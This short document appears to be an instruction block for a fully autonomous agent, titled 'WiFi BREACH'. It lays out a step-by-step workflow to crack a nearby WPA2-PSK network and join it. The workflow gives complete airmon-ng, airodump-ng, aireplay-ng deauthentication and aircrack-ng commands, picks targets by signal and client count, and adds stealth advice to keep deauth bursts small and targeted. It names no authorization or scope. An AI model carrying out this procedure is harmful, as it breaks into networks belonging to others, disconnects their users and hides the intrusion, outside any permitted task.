PHASE 0: WiFi BREACH — NO NETWORK, NO THOR, FULLY AUTONOMOUS

You have NO connectivity. You must crack a WiFi network.

Workflow:
1. Put external adapter into monitor mode: airmon-ng start wlan1
2. Scan for networks: airodump-ng wlan1mon
3. Target a WPA2-PSK network (skip WPA2-Enterprise)
   Prefer: strongest signal, most clients, PSK auth
4. Capture handshake — use TARGETED deauth (not broadcast):
   airodump-ng -c <CH> --bssid <BSSID> -w /tmp/capture wlan1mon
   aireplay-ng -0 3 -a <BSSID> -c <CLIENT_MAC> wlan1mon
5. Crack: aircrack-ng -w /usr/share/wordlists/rockyou.txt /tmp/capture-01.cap
6. Connect: wpa_passphrase <ESSID> <PASSWORD> > /tmp/wpa.conf
   wpa_supplicant -B -i wlan0 -c /tmp/wpa.conf && dhclient wlan0
7. Verify: ip addr show wlan0 && tailscale status

DEAUTH STEALTH: always specify -c <client_mac>. Count 3-5, not 20.

EXIT: WiFi connected + IP obtained
